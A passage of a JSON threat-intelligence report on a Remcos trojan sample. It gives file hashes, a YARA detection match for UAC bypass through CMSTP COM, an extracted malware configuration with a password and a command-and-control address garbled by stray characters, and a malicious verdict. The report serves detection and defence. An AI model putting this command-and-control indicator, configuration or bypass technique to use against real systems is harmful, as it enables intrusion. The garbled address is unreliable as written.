          "rule_name": "INDICATOR_SUSPICIOUS_EXE_UACBypass_CMSTPCOM",
          "match_date": 1754556590,
          "description": "Detects Windows exceutables bypassing UAC using CMSTP COM interfaces. MITRE (T1218.003)",
          "author": "ditekSHen",
          "source": "https://github.com/ditekshen/detection"
        }
      ],
      "tlsh": "T11DB4AD01B6D2C0B2D57654300D26E775DEBDBD202836997BB3DA0D57FD70180AB2ABB2",
      "type_description": "Win32 EXE",
      "unique_sources": 1,
      "authentihash": "b6e0f0477e754f3875e7a7670207936e74b62c8dee77280085d74244272e325f",
      "malware_config": {
        "families": [
          {
            "family": "remcos",
            "configs": [
              {
                "txt_configs": [
                  "{\"Version\": [\"7.0.1 Pro\"], \"Control\": [\"tcp://\\u03f2\\u0000172.94.9\\u00006.90:599\\u00009\"], \"Password\": [\"1\\u001e\"]}"
                ],
                "net_info": {
                  "connections": [
                    {
                      "host": "\u03f2\u0000172.94.9\u00006.90",
                      "url": "tcp://\u03f2\u0000172.94.9\u00006.90:599\u00009",
                      "categories": [
                        "C2"
                      ]
                    }
                  ]
                },
                "tool": "VIRUSTOTAL_CAPE",
                "implant_info": {
                  "version": "7.0.1 Pro"
                }
              }
            ]
          }
        ]
      },
      "gti_assessment": {
        "contributing_factors": {
          "gti_confidence_score": 90,
          "gavs_detections": 3,
          "normalised_categories": [
            "trojan"
          ],
          "associated_malware_configuration": true
        },
        "verdict": {
          "value": "VERDICT_MALICIOUS"
        },
        "threat_score": {
          "value": 30
        },
        "severity": {
          "value": "SEVERITY_LOW"
        },
        "description": "This indicator is malicious (low severity). It was detected by Google's spam and threat filtering engines, contains known malware configurations, it was matched by Google's curated Yara rules, it is contained within a collection provided by the Google Threat Intelligence team, or a trusted partner or security researcher and analysis confirms configuration consistent with a well-known malware family."
      }
    },
    "context_attributes": {
      "notification_id": "23089986176",
      "origin": "subscriptions",
      "notification_date": 1754556770,
      "sources": [
        {
          "id": "3ff838331eb3691b10b42e03786c2f9a5c20f4d9ed91894c8a13987dd64f32c2",
          "type": "collection",
          "label": "Remcos Malware"
        }
      ],
      "tags": [],
      "hunting_info": null
    }
  }
]
```